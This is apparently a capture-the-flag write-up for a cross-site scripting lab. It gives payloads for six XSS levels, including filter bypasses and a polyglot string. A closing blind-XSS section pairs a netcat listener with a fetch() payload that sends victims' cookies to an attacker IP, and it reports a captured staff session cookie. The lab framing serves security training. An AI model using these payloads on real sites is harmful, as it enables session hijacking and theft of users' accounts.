# Part 1
The aim for each level will be to execute the JavaScript alert function with the string THM

## Level 1

You're presented with a form asking you to enter your name, and once you've entered something, it will be presented on a line below.

If you view the Page Source, You'll see the text you just entered reflected in the code.

We can simply pass in `<script>alert('THM')</script>` to complete this level

## Level 2

Level 2 starts with the same form, however when you submit what you put shows up in an input field.

In order to run a payload we need to escape the input tag. This can be done like so `"><script>alert('THM');</script>`

## Level 3

Same things as the previous 2 levels, but the input is now in a text field.

escaping the text field can be done like so `</textarea><script>alert('THM')</script>`

## Level 4

Same input as previous levels however the name is put in by JS code. In order to run our code, we have to escape the previous function. This can be done like so ``';alert('THM');//``

## Level 5

Input is sanitized on the backend by removing keywords like script. We can bypass this by embedding keywords within themselves so what's sent back to the webpage is the script. ``<sscriptcript>alert('THM');</sscriptcript>``

## Level 6

Our input is reflected as the source of an image. Attempting to bypass this in a similar way to level 2 does not work as the tags <> are filtered out. Instead you can use a payload like this `/images/cat.jpg" onload="alert('THM');` that executes when the image is loaded

## XSS Polyglot

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. 

A polyglot that would work for all 6 levels is shown below

``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``

# Practical Example Blind XSS

This lab has an input form, the user's input is put into a text field. The text field can simply be escaped and an xss payload executed. In this case a simple alert  `</textarea><script>alert('THM');</script>` for a proof of concept.

When viewing the ticket that was just created, we see that the script executes properly.

With a proof of concept executed, the script can be expanded to attempt to hijack a "staff" session.

To start, we'll want to setup a server to which our script can callback. This can be done using [[Netcat]] `nc -nlvp 9001 

Now that we have a server listening for the callback, we can create a script that sends information to us. `</textarea><script>fetch('http://10.13.50.190:9001?cookie=' + btoa(document.cookie) );</script>`

After some time a "staff member" checks the ticket, forwarding the following cookie information to our listening port. 4AB305E55955197693F01D6F8FD2D321